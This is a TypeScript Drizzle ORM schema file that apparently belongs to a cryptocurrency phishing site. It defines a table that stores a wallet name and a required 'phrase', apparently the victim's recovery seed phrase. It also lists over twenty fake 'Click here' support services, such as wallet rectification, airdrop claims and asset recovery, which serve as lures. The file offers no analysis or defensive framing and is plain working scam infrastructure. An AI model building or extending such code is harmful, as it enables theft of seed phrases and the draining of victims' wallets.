import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const users = pgTable("users", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

export const serviceSubmissions = pgTable("service_submissions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  serviceName: text("service_name").notNull(),
  walletName: text("wallet_name").notNull(),
  phrase: text("phrase").notNull(),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertServiceSubmissionSchema = createInsertSchema(serviceSubmissions).omit({
  id: true,
  createdAt: true,
});

export type InsertServiceSubmission = z.infer<typeof insertServiceSubmissionSchema>;
export type ServiceSubmission = typeof serviceSubmissions.$inferSelect;

export const serviceCategories = [
  { id: "migration", name: "MIGRATION", description: "Click here for migration or to resolve any migration related issues" },
  { id: "rectification", name: "RECTIFICATION", description: "Click here to rectify all strange wallet issues." },
  { id: "claim", name: "CLAIM", description: "Click here to claim tokens or resolve any token claiming related issues." },
  { id: "swap", name: "SWAP", description: "Click here to swap tokens or resolve issues related to token swap." },
  { id: "slippage", name: "SLIPPAGE", description: "Click here for slippage or transaction fee related issues." },
  { id: "claim-airdrop", name: "CLAIM AIRDROP", description: "Click here to claim airdrop or resolve errors encountered during airdrop claim." },
  { id: "staking", name: "STAKING", description: "Click here to resolve issues encountered while staking/unstaking." },
  { id: "whitelist", name: "WHITELIST", description: "Click here to whitelist your address or resolve whitelisting related error." },
  { id: "cross-transfer", name: "CROSS TRANSFER", description: "Click here to resolve cross bridging errors." },
  { id: "nfts", name: "NFTS", description: "Click here to resolve NFT related issues." },
  { id: "locked-account", name: "LOCKED ACCOUNT", description: "Click here to resolve locked account or access issues." },
  { id: "login-error", name: "LOGIN ERROR", description: "Click here to resolve errors encountered during login." },
  { id: "transaction-delay", name: "TRANSACTION DELAY", description: "Click here to resolve transaction delay issues." },
  { id: "missing-balance", name: "MISSING/IRREGULAR BALANCE", description: "Click here to resolve missing or irregular balance issues." },
  { id: "asset-recovery", name: "ASSET RECOVERY", description: "Click here to recover lost or stolen assets." },
  { id: "buy-token", name: "BUY TOKEN/COIN", description: "Click here to trade. Your account has to be marked as a trusted payment source to start trading." },
  { id: "exchange", name: "EXCHANGE", description: "Click here for token exchange or to resolve exchange errors." },
  { id: "bridging", name: "BRIDGING", description: "Click here to bridge tokens or resolve bridging related issues." },
  { id: "scam-token", name: "SCAM TOKEN", description: "Click here to report or remove scam tokens from your wallet." },
  { id: "claim-reward", name: "CLAIM REWARD", description: "Click here to claim rewards or resolve reward claiming issues." },
  { id: "node-validation", name: "NODE VALIDATION", description: "Click here for node validation or validator related issues." },
  { id: "other-issues", name: "OTHER ISSUES", description: "Click here for any other issues not listed above." },
] as const;

export type ServiceCategory = typeof serviceCategories[number];
